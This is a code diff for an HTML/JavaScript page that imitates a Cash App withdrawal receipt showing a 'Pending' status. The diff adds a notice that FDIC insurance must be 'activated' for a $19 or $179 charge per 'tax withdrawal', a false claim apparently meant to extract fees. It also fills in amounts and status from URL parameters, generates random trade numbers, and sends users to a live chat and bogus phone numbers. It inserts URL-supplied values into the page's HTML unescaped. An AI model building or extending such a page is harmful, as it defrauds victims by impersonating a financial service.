@@ -20,8 +20,8 @@
         }
 
         body {
-            background-color: #eef0f2;
-            color: #1c1e21;
+            background-color: #0b0b0d;
+            color: #ffffff;
             display: flex;
             justify-content: center;
             align-items: stretch;
@@ -29,7 +29,6 @@
             padding: 0;
         }
 
-        /* Ensure any embedded or added media scales cleanly and can go full-size */
         img,
         video,
         picture,
@@ -51,10 +50,10 @@
             width: 100%;
             max-width: 640px;
             min-height: 100vh;
-            background: #ffffff;
+            background: #0d0d10;
             padding: 20px 24px 32px;
-            box-shadow: 0 10px 30px rgba(15, 23, 42, 0.08);
-            border: 1px solid #e5e7eb;
+            box-shadow: 0 12px 36px rgba(0, 0, 0, 0.55);
+            border: 1px solid #1e1e24;
             display: flex;
             flex-direction: column;
         }
@@ -67,17 +66,17 @@
 
             .receipt-card {
                 min-height: auto;
-                border-radius: 22px;
+                border-radius: 24px;
             }
         }
 
-        /* Top Navigation Bar (< | Title | x) */
+        /* Top Navigation Bar (< | Title | ...) */
         .top-bar {
             display: grid;
             grid-template-columns: 36px 1fr 36px;
             align-items: center;
             gap: 8px;
-            margin-bottom: 22px;
+            margin-bottom: 24px;
         }
 
         .nav-btn {
@@ -85,7 +84,7 @@
             height: 36px;
             border: none;
             background: transparent;
-            color: #1c1e21;
+            color: #ffffff;
             border-radius: 50%;
             cursor: pointer;
             display: inline-flex;
@@ -95,25 +94,25 @@
         }
 
         .nav-btn:hover {
-            background-color: #f3f4f6;
+            background-color: #1b1b20;
         }
 
         .nav-btn:active {
-            background-color: #e5e7eb;
+            background-color: #26262e;
         }
 
         .top-title {
             text-align: center;
             font-size: 16px;
             font-weight: 600;
-            color: #1c1e21;
+            color: #ffffff;
             white-space: nowrap;
             overflow: hidden;
             text-overflow: ellipsis;
         }
 
-        /* Hero Badge & Status Heading */
-        .status-hero {
+        /* Center Profile / Account Avatar & Transaction Summary */
+        .tx-hero {
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -121,162 +120,171 @@
             margin-bottom: 28px;
         }
 
-        .hero-badge {
-            width: 60px;
-            height: 60px;
+        .profile-avatar-wrap {
+            position: relative;
+            width: 64px;
+            height: 64px;
             border-radius: 50%;
+            background-color: #1f2937;
+            border: 2px solid #2e7d32;
+            overflow: hidden;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: #ffffff;
-            font-size: 24px;
-            background-color: #2e7d32;
             margin-bottom: 14px;
         }
 
-        .status-hero h1 {
-            font-size: 28px;
-            font-weight: 400;
-            color: #1c1e21;
-            line-height: 1.2;
+        .profile-avatar-wrap img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
         }
 
-        .status-pill {
-            margin-top: 8px;
-            font-size: 12px;
+        .profile-avatar-fallback {
+            color: #ffffff;
+            font-size: 22px;
             font-weight: 600;
-            padding: 3px 10px;
-            border-radius: 999px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
         }
 
-        .status-pill.status-pending {
-            background-color: #fff4e5;
-            color: #b25e09;
+        .tx-destination {
+            font-size: 16px;
+            font-weight: 600;
+            color: #ffffff;
+            margin-bottom: 3px;
+            word-break: break-word;
         }
 
-        .status-pill.status-completed {
-            background-color: #e8f5e9;
-            color: #2e7d32;
+        .tx-subaccount {
+            font-size: 13px;
+            color: #9ca3af;
+            margin-bottom: 18px;
         }
 
-        /* Vertical Step Timeline */
-        .timeline {
-            position: relative;
-            margin-bottom: 28px;
+        .tx-amount {
+            font-size: 40px;
+            font-weight: 600;
+            color: #ffffff;
+            letter-spacing: -0.02em;
+            line-height: 1.15;
+            margin-bottom: 8px;
         }
 
-        .timeline-item {
-            position: relative;
-            display: flex;
-            align-items: flex-start;
-            gap: 16px;
-            padding-bottom: 24px;
+        .tx-time {
+            font-size: 14px;
+            color: #9ca3af;
         }
 
-        .timeline-item:last-child {
-            padding-bottom: 0;
+        /* Status Explanation Box */
+        .reason-box {
+            background-color: #18181c;
+            border: 1px solid #26262d;
+            border-radius: 18px;
+            padding: 20px 18px;
+            text-align: center;
+            margin-bottom: 24px;
         }
 
-        .timeline-item:not(:last-child)::after {
-            content: '';
-            position: absolute;
-            left: 11px;
-            top: 26px;
-            bottom: -2px;
-            width: 2px;
-            background-color: #2e7d32;
-        }
-
-        .step-icon {
-            position: relative;
-            z-index: 2;
+        .reason-dots {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
             width: 24px;
             height: 24px;
             border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-            margin-top: 1px;
+            background-color: #6b7280;
+            color: #18181c;
             font-size: 11px;
+            margin-bottom: 10px;
         }
 
-        .timeline-item.done .step-icon {
+        .reason-title {
+            font-size: 15px;
+            font-weight: 600;
+            color: #ffffff;
+            margin-bottom: 8px;
+        }
+
+        .reason-text {
+            font-size: 13.5px;
+            color: #9ca3af;
+            line-height: 1.55;
+        }
+
+        /* Compact Details List */
+        .details-box {
+            background-color: #141418;
+            border: 1px solid #222228;
+            border-radius: 18px;
+            padding: 14px 18px;
+            margin-bottom: 22px;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: baseline;
+            gap: 14px;
+            padding: 9px 0;
+            border-bottom: 1px solid #1e1e24;
+            font-size: 13.5px;
+        }
+
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+
+        .detail-key {
+            color: #9ca3af;
+            flex-shrink: 0;
+        }
+
+        .detail-val {
+            color: #f3f4f6;
+            font-weight: 500;
+            text-align: right;
+            word-break: break-word;
+        }
+
+        /* Bottom Status Pill Button */
+        .status-pill-btn {
+            width: 100%;
+            padding: 14px 20px;
+            border-radius: 999px;
+            font-size: 15px;
+            font-weight: 600;
+            text-align: center;
+            display: block;
+            margin-bottom: 20px;
+        }
+
+        .status-pill-btn.status-pending {
+            background-color: #1f2937;
+            color: #f9fafb;
+            border: 1px solid #374151;
+        }
+
+        .status-pill-btn.status-completed {
             background-color: #2e7d32;
             color: #ffffff;
-        }
-
-        .timeline-item.active .step-icon {
-            background-color: #ffffff;
-            border: 2px solid #2e7d32;
-            color: #2e7d32;
-        }
-
-        .step-content {
-            flex: 1;
-        }
-
-        .step-title {
-            font-size: 14px;
-            font-weight: 500;
-            color: #1c1e21;
-            line-height: 1.42;
-        }
-
-        .step-sub {
-            font-size: 12.5px;
-            color: #6b7280;
-            margin-top: 3px;
-            line-height: 1.42;
-        }
-
-        /* Transaction Details */
-        .details-section {
-            border-top: 1px solid #eceef2;
-            padding-top: 20px;
-        }
-
-        .details-section h2 {
-            font-size: 16px;
-            font-weight: 600;
-            color: #1c1e21;
-            margin-bottom: 16px;
-        }
-
-        .detail-item {
-            margin-bottom: 14px;
-        }
-
-        .detail-item:last-child {
-            margin-bottom: 0;
-        }
-
-        .detail-label {
-            font-size: 12.5px;
-            font-weight: 600;
-            color: #374151;
-            margin-bottom: 2px;
-        }
-
-        .detail-value {
-            font-size: 14px;
-            color: #4b5563;
-            word-break: break-word;
         }
 
         /* Footer Help Section */
         .footer-help {
             margin-top: auto;
-            padding-top: 24px;
-            border-top: 1px solid #eceef2;
+            padding-top: 20px;
+            border-top: 1px solid #222228;
             text-align: center;
             font-size: 12px;
-            color: #6b7280;
+            color: #9ca3af;
             line-height: 1.5;
         }
 
         .footer-help a {
-            color: #2e7d32;
+            color: #4ade80;
             font-weight: 500;
             text-decoration: none;
             cursor: pointer;
@@ -287,7 +295,7 @@
         }
 
         .call-charges {
-            color: #9ca3af;
+            color: #6b7280;
             margin-top: 4px;
         }
     </style>
@@ -311,96 +319,70 @@
             </button>
         </div>
 
-        <!-- Status Hero Header -->
-        <div class="status-hero">
-            <div class="hero-badge" id="hero-badge">
-                <i class="fa-solid fa-clock" id="hero-icon"></i>
+        <!-- Profile Avatar + Destination + Amount + Time -->
+        <div class="tx-hero">
+            <div class="profile-avatar-wrap" id="profile-avatar-wrap">
+                <img id="account-profile-img" alt="Account Profile" style="display: none;">
+                <span class="profile-avatar-fallback" id="account-profile-fallback"><i class="fa-solid fa-user"></i></span>
             </div>
-            <h1 id="hero-title">Pending</h1>
-            <span class="status-pill status-pending" id="display-status">Pending</span>
+            <div class="tx-destination" id="display-destination">External Account</div>
+            <div class="tx-subaccount" id="display-from">Primary Balance</div>
+            <div class="tx-amount" id="hero-amount">$0.00</div>
+            <div class="tx-time" id="hero-time">Just now</div>
         </div>
 
-        <!-- Timeline Steps -->
-        <div class="timeline">
-            <!-- Step 1 -->
-            <div class="timeline-item done" id="step-1">
-                <div class="step-icon"><i class="fa-solid fa-check"></i></div>
-                <div class="step-content">
-                    <div class="step-title" id="step-1-title">You submitted a withdrawal to External Account.</div>
-                    <div class="step-sub" id="step-1-time">Submitted: Just now</div>
-                </div>
-            </div>
+        <!-- Status Explanation Card -->
+        <div class="reason-box">
+            <div class="reason-dots"><i class="fa-solid fa-ellipsis"></i></div>
+            <div class="reason-title" id="reason-title">Why is this pending?</div>
+            <p class="reason-text" id="reason-text">
+                Your withdrawal of <strong id="reason-amount">$0.00 USD</strong> at <strong id="reason-time">Just now</strong> to <strong id="reason-dest">External Account</strong> is awaiting confirmation. FDIC pass-through insurance applies specifically to money held in Cash App. FDIC insurance requires activation and incurs a $19 charge per tax withdrawal.
+            </p>
+        </div>
 
-            <!-- Step 2 -->
-            <div class="timeline-item done" id="step-2">
-                <div class="step-icon"><i class="fa-solid fa-check"></i></div>
-                <div class="step-content">
-                    <div class="step-title" id="step-2-title">We processed your withdrawal and passed security verification.</div>
-                    <div class="step-sub" id="step-2-time">Verified: Just now</div>
-                </div>
+        <!-- Details -->
+        <div class="details-box">
+            <div class="detail-row">
+                <span class="detail-key">Trade No.</span>
+                <span class="detail-val" id="display-tradeno">---</span>
             </div>
-
-            <!-- Step 3: Active / Pending Institution Confirmation -->
-            <div class="timeline-item active" id="step-3">
-                <div class="step-icon"><i class="fa-solid fa-hourglass-half" id="step-3-icon"></i></div>
-                <div class="step-content">
-                    <div class="step-title" id="step-3-title">Awaiting confirmation from FDIC.</div>
-                    <div class="step-sub" id="step-3-meta">Processing time depends and should take up to 48-72 hours for FDIC full verification.</div>
-                </div>
+            <div class="detail-row">
+                <span class="detail-key">Amount</span>
+                <span class="detail-val" id="display-amount">$0.00 USD</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-key">Transaction Time</span>
+                <span class="detail-val" id="display-submission-date">---</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-key">Type</span>
+                <span class="detail-val" id="display-type">Withdrawals</span>
+            </div>
+            <div class="detail-row" id="destination-row">
+                <span class="detail-key" id="destination-label">Withdraw To</span>
+                <span class="detail-val" id="detail-destination">Loading...</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-key">After Balance</span>
+                <span class="detail-val" id="display-after-balance">---</span>
             </div>
         </div>
 
-        <!-- Details Section -->
-        <div class="details-section">
-            <h2>Details</h2>
-
-            <div class="detail-item">
-                <div class="detail-label">Trade No.</div>
-                <div class="detail-value" id="display-tradeno">---</div>
-            </div>
-
-            <div class="detail-item">
-                <div class="detail-label">Submission Date</div>
-                <div class="detail-value" id="display-submission-date">---</div>
-            </div>
-
-            <div class="detail-item">
-                <div class="detail-label">Amount</div>
-                <div class="detail-value" id="display-amount">0.00 USD</div>
-            </div>
-
-            <div class="detail-item">
-                <div class="detail-label">Type</div>
-                <div class="detail-value" id="display-type">Withdrawals</div>
-            </div>
-
-            <div class="detail-item">
-                <div class="detail-label">From</div>
-                <div class="detail-value" id="display-from">Primary Balance</div>
-            </div>
-
-            <div class="detail-item">
-                <div class="detail-label" id="destination-label">Withdraw To</div>
-                <div class="detail-value" id="display-destination">Loading...</div>
-            </div>
-
-            <div class="detail-item">
-                <div class="detail-label">After Balance</div>
-                <div class="detail-value" id="display-after-balance">---</div>
-            </div>
-        </div>
+        <!-- Status Pill -->
+        <span class="status-pill-btn status-pending" id="display-status">Pending</span>
 
         <!-- Footer Help Section -->
         <div class="footer-help">
-            <p>Need help? Reach out to <a href="https://tawk.to/chat/6ae571b0580744346f2f26eb/default" target="_blank" rel="noopener noreferrer" onclick="return openTawkSupport(event);">Customer Service</a>,</p>
+            <p>Need help? Contact <a href="https://tawk.to/chat/6ae571b0580744346f2f26eb/default" target="_blank" rel="noopener noreferrer" onclick="return openTawkSupport(event);">Customer Service</a>,</p>
             <p>or call <a href="tel:800888877866855">800, 888, 877, 866, 855</a> / <a href="tel:833">833</a>.</p>
-            <p class="call-charges">Confirmation charges may apply as per your service provider.</p>
+            <p class="call-charges">Standard carrier or confirmation charges may apply depending on your service provider.</p>
         </div>
     </div>
 
-    <!-- Script to dynamically load transaction information, exact date/timestamp, navigation, and Tawk.to support -->
     <script>
         const FALLBACK_DASHBOARD_URL = 'dashboard.html';
+        const FDIC_PENDING_NOTICE =
+            'FDIC pass-through insurance applies specifically to money held in Cash App. FDIC insurance requires activation and incurs a $179 charge per tax withdrawal.';
 
         function goBackSafe() {
             const sameOriginReferrer =
@@ -463,15 +445,163 @@
             return params;
         }
 
-        function getSavedIntent() {
+        function safeJsonParse(raw) {
+            if (!raw || typeof raw !== 'string') return null;
             try {
-                const raw = localStorage.getItem('currentTxIntent');
-                const parsed = raw ? JSON.parse(raw) : {};
-                return parsed && typeof parsed === 'object' ? parsed : {};
-            } catch (err) {
-                console.warn('Invalid currentTxIntent in localStorage:', err);
-                return {};
+                const parsed = JSON.parse(raw);
+                return parsed && typeof parsed === 'object' ? parsed : null;
+            } catch (_) {
+                return null;
             }
+        }
+
+        function getSavedIntent() {
+            const intentKeys = ['currentTxIntent', 'txIntent', 'lastTransaction', 'activeTransaction'];
+            for (const key of intentKeys) {
+                const parsed = safeJsonParse(localStorage.getItem(key));
+                if (parsed) return parsed;
+            }
+            return {};
+        }
+
+        function getLiveDashboardDate(params, savedIntent) {
+            const paramCandidates = [
+                params.date,
+                params.timestamp,
+                params.time,
+                params.createdAt,
+                params.updatedAt,
+                params.submittedAt
+            ];
+            for (const val of paramCandidates) {
+                if (val !== undefined && val !== null && String(val).trim() !== '') {
+                    return val;
+                }
+            }
+
+            const intentCandidates = [
+                savedIntent.timestamp,
+                savedIntent.date,
+                savedIntent.createdAt,
+                savedIntent.updatedAt,
+                savedIntent.submittedAt,
+                savedIntent.time
+            ];
+            for (const val of intentCandidates) {
+                if (val !== undefined && val !== null && String(val).trim() !== '') {
+                    return val;
+                }
+            }
+
+            const directDateKeys = [
+                'dashboardDate',
+                'liveDate',
+                'lastUpdated',
+                'serverTime',
+                'transactionDate',
+                'currentDate'
+            ];
+            for (const key of directDateKeys) {
+                const val = localStorage.getItem(key);
+                if (val && val.trim()) return val.trim();
+            }
+
+            const dashboardStateKeys = ['dashboardState', 'liveDashboard', 'dashboardData', 'accountData'];
+            for (const key of dashboardStateKeys) {
+                const obj = safeJsonParse(localStorage.getItem(key));
+                if (!obj) continue;
+                const nestedCandidate =
+                    obj.timestamp ??
+                    obj.date ??
+                    obj.lastUpdated ??
+                    obj.serverTime ??
+                    obj.currentDate ??
+                    obj.transaction?.timestamp ??
+                    obj.transaction?.date;
+                if (nestedCandidate !== undefined && nestedCandidate !== null && String(nestedCandidate).trim() !== '') {
+                    return nestedCandidate;
+                }
+            }
+
+            return null;
+        }
+
+        function getDashboardAccountImage(params, savedIntent) {
+            const paramImage =
+                params.avatar ||
+                params.profileImg ||
+                params.profileImage ||
+                params.accountImg ||
+                params.accountImage ||
+                params.photo ||
+                params.image;
+            if (paramImage && String(paramImage).trim()) {
+                return String(paramImage).trim();
+            }
+
+            const intentImage =
+                savedIntent.avatar ||
+                savedIntent.profileImg ||
+                savedIntent.profileImage ||
+                savedIntent.accountImg ||
+                savedIntent.accountImage ||
+                savedIntent.photo ||
+                savedIntent.image;
+            if (intentImage && String(intentImage).trim()) {
+                return String(intentImage).trim();
+            }
+
+            const directKeys = [
+                'dashboardProfileImg',
+                'dashboardAvatar',
+                'accountProfileImg',
+                'accountAvatar',
+                'profileImage',
+                'profileImg',
+                'accountImage',
+                'accountImg',
+                'userAvatar',
+                'avatarUrl',
+                'userPhoto'
+            ];
+            for (const key of directKeys) {
+                const val = localStorage.getItem(key);
+                if (val && val.trim()) return val.trim();
+            }
+
+            const objectKeys = [
+                'dashboardProfile',
+                'dashboardState',
+                'liveDashboard',
+                'accountProfile',
+                'userProfile',
+                'currentUser',
+                'accountData',
+                'dashboardData'
+            ];
+            for (const key of objectKeys) {
+                const obj = safeJsonParse(localStorage.getItem(key));
+                if (!obj) continue;
+                const candidate =
+                    obj.avatar ||
+                    obj.profileImg ||
+                    obj.profileImage ||
+                    obj.accountImg ||
+                    obj.accountImage ||
+                    obj.photo ||
+                    obj.image ||
+                    obj.user?.avatar ||
+                    obj.user?.profileImg ||
+                    obj.user?.profileImage ||
+                    obj.profile?.avatar ||
+                    obj.profile?.profileImg ||
+                    obj.profile?.image;
+                if (candidate && typeof candidate === 'string' && candidate.trim()) {
+                    return candidate.trim();
+                }
+            }
+
+            return '';
         }
 
         function parseTransactionDate(rawTimestamp) {
@@ -479,7 +609,9 @@
                 const strVal = String(rawTimestamp).trim();
                 const numVal = Number(strVal);
                 if (!Number.isNaN(numVal) && numVal > 0) {
-                    const d = new Date(numVal);
+                    // Handle 10-digit Unix seconds if provided
+                    const msVal = numVal < 1e12 ? numVal * 1000 : numVal;
+                    const d = new Date(msVal);
                     if (!Number.isNaN(d.getTime())) return d;
                 }
                 const parsedMs = Date.parse(strVal);
@@ -491,21 +623,56 @@
             return new Date();
         }
 
-        window.addEventListener('DOMContentLoaded', () => {
+        function formatShortDateTime(dateObj) {
+            const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
+            const month = months[dateObj.getMonth()];
+            const day = dateObj.getDate();
+            let hours = dateObj.getHours();
+            const mins = String(dateObj.getMinutes()).padStart(2, '0');
+            const ampm = hours >= 12 ? 'PM' : 'AM';
+            hours = hours % 12;
+            if (hours === 0) hours = 12;
+            return `${month} ${day} at ${hours}:${mins} ${ampm}`;
+        }
+
+        function renderWithdrawalStatus() {
             const params = getQueryParams();
             const savedIntent = getSavedIntent();
 
             const amountVal = params.amount ?? savedIntent.amount ?? '0.00';
             const destinationVal = String(params.bank || savedIntent.rawTarget || savedIntent.target || 'External Account');
-            const fromVal = String(params.from || savedIntent.from || savedIntent.source || 'Primary Balance');
+            const fromVal = String(params.from || savedIntent.from || savedIntent.source || 'CashApp Balance');
             const typeVal = String(params.type || savedIntent.type || 'Withdrawals');
             const tradeNoVal = String(params.tradeno || savedIntent.tradeNo || ('261116' + Math.floor(100000 + Math.random() * 900000)));
             const statusVal = String(params.status || savedIntent.status || 'Pending');
             const afterBalanceVal = String(params.after ?? savedIntent.afterBalance ?? '---');
 
-            const txDateObj = parseTransactionDate(params.date ?? savedIntent.timestamp);
+            // Account / Profile image from dashboard / intent / storage
+            const profileImgUrl = getDashboardAccountImage(params, savedIntent);
+            const imgEl = document.getElementById('account-profile-img');
+            const fallbackEl = document.getElementById('account-profile-fallback');
+            if (profileImgUrl) {
+                imgEl.onload = () => {
+                    imgEl.style.display = 'block';
+                    fallbackEl.style.display = 'none';
+                };
+                imgEl.onerror = () => {
+                    imgEl.removeAttribute('src');
+                    imgEl.style.display = 'none';
+                    fallbackEl.style.display = 'inline-flex';
+                };
+                imgEl.src = profileImgUrl;
+            } else {
+                imgEl.removeAttribute('src');
+                imgEl.style.display = 'none';
+                fallbackEl.style.display = 'inline-flex';
+            }
 
-            const formattedTxDate =
+            // Live dashboard date/timestamp
+            const rawDate = getLiveDashboardDate(params, savedIntent);
+            const txDateObj = parseTransactionDate(rawDate);
+            const shortTimeStr = formatShortDateTime(txDateObj);
+            const fullDateStr =
                 `${String(txDateObj.getDate()).padStart(2, '0')}/` +
                 `${String(txDateObj.getMonth() + 1).padStart(2, '0')}/` +
                 `${txDateObj.getFullYear()} ` +
@@ -514,52 +681,24 @@
 
             const cleanAmount = String(amountVal).replace(/[^0-9.-]/g, '');
             const num = parseFloat(cleanAmount);
-            const formattedAmount = cleanAmount !== '' && !Number.isNaN(num)
-                ? `${num.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD`
-                : `${amountVal} USD`;
-            document.getElementById('display-amount').innerText = formattedAmount;
+            const formattedNum = cleanAmount !== '' && !Number.isNaN(num)
+                ? num.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })
+                : String(amountVal);
 
-            const normalizedStatus = statusVal.toLowerCase();
-            const isCompleted = normalizedStatus === 'completed' || normalizedStatus === 'complete';
-            const heroTitleEl = document.getElementById('hero-title');
-            const heroIconEl = document.getElementById('hero-icon');
-            const statusEl = document.getElementById('display-status');
-            const step3El = document.getElementById('step-3');
-            const step3IconEl = document.getElementById('step-3-icon');
-            const step3TitleEl = document.getElementById('step-3-title');
-            const step3MetaEl = document.getElementById('step-3-meta');
+            const heroAmountText = `$${formattedNum}`;
+            const detailAmountText = `$${formattedNum} USD`;
 
-            statusEl.innerText = statusVal;
-            statusEl.classList.remove('status-pending', 'status-completed');
-
-            if (isCompleted) {
-                heroTitleEl.innerText = 'Complete';
-                heroIconEl.className = 'fa-solid fa-check';
-                statusEl.classList.add('status-completed');
-                step3El.classList.remove('active');
-                step3El.classList.add('done');
-                step3IconEl.className = 'fa-solid fa-check';
-                step3TitleEl.innerText = `Funds sent to ${destinationVal}.`;
-                step3MetaEl.innerText = `Completed: ${formattedTxDate}`;
-            } else {
-                heroTitleEl.innerText = 'Pending';
-                heroIconEl.className = 'fa-solid fa-clock';
-                statusEl.classList.add('status-pending');
-                step3El.classList.remove('done');
-                step3El.classList.add('active');
-                step3IconEl.className = 'fa-solid fa-hourglass-half';
-                step3TitleEl.innerText = 'Awaiting confirmation from FDIC.';
-                step3MetaEl.innerText = `Submitted: ${formattedTxDate} — Processing time depends and should take up to 48-72 hours for FDIC full verification.`;
-            }
-
-            document.getElementById('step-1-title').innerText = `You submitted a withdrawal to ${destinationVal}.`;
-            document.getElementById('step-1-time').innerText = `Submitted: ${formattedTxDate}`;
-            document.getElementById('step-2-time').innerText = `Verified: ${formattedTxDate}`;
-
+            document.getElementById('hero-amount').innerText = heroAmountText;
+            document.getElementById('hero-time').innerText = shortTimeStr;
+            document.getElementById('display-destination').innerText = destinationVal;
+            document.getElementById('detail-destination').innerText = destinationVal;
+            document.getElementById('display-from').innerText = fromVal;
+            document.getElementById('display-amount').innerText = detailAmountText;
+            document.getElementById('display-submission-date').innerText = `${shortTimeStr} (${fullDateStr})`;
+            document.getElementById('display-tradeno').innerText = tradeNoVal;
             document.getElementById('top-page-title').innerText = typeVal;
             document.getElementById('display-type').innerText = typeVal;
-            document.getElementById('display-from').innerText = fromVal;
-            document.getElementById('display-destination').innerText = destinationVal;
+            document.getElementById('display-after-balance').innerText = afterBalanceVal;
 
             const labelEl = document.getElementById('destination-label');
             if (destinationVal.startsWith('bc1') || destinationVal.startsWith('1') || destinationVal.startsWith('3')) {
@@ -570,10 +709,28 @@
                 labelEl.innerText = 'Withdraw To';
             }
 
-            document.getElementById('display-tradeno').innerText = tradeNoVal;
-            document.getElementById('display-submission-date').innerText = formattedTxDate;
-            document.getElementById('display-after-balance').innerText = afterBalanceVal;
-        });
+            const normalizedStatus = statusVal.toLowerCase();
+            const isCompleted = normalizedStatus === 'completed' || normalizedStatus === 'complete';
+            const statusEl = document.getElementById('display-status');
+            const reasonTitleEl = document.getElementById('reason-title');
+            const reasonTextEl = document.getElementById('reason-text');
+
+            statusEl.innerText = statusVal;
+            statusEl.classList.remove('status-pending', 'status-completed');
+
+            if (isCompleted) {
+                statusEl.classList.add('status-completed');
+                reasonTitleEl.innerText = 'Why is this complete?';
+                reasonTextEl.innerHTML = `Your withdrawal of <strong>${detailAmountText}</strong> at <strong>${shortTimeStr}</strong> has been confirmed and sent to <strong>${destinationVal}</strong>.`;
+            } else {
+                statusEl.classList.add('status-pending');
+                reasonTitleEl.innerText = 'Why is this pending?';
+                reasonTextEl.innerHTML = `Your withdrawal of <strong>${detailAmountText}</strong> at <strong>${shortTimeStr}</strong> to <strong>${destinationVal}</strong> is awaiting confirmation. ${FDIC_PENDING_NOTICE}`;
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', renderWithdrawalStatus);
+        window.addEventListener('storage', renderWithdrawalStatus);
     </script>
 
     <!-- Tawk.to Live Chat Script Integration -->
